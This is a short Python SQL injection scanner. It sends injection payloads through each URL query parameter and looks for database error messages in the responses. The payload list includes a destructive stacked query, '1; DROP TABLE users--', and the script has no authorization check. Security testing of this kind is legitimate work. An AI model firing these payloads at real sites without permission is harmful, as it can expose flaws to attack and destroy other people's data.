#!/usr/bin/env python3
"""SQLi Scanner"""
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = ["'", "''", "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--"]
ERROR_SIGNATURES = ["sql syntax", "mysql_fetch", "ORA-", "sqlite_", "syntax error", "unclosed quotation"]

class SQLiScanner:
    def __init__(self, url):
        self.url = url

    def scan(self):
        findings = []
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        
        if not params:
            return findings
        
        for param in params:
            for payload in PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                try:
                    r = requests.get(test_url, timeout=5)
                    for sig in ERROR_SIGNATURES:
                        if sig.lower() in r.text.lower():
                            findings.append({
                                "type": "SQL Injection",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "severity": "CRITICAL"
                            })
                            print(f"[!] SQLi: {self.url} | param={param}")
                            break
                except:
                    pass
        return findings
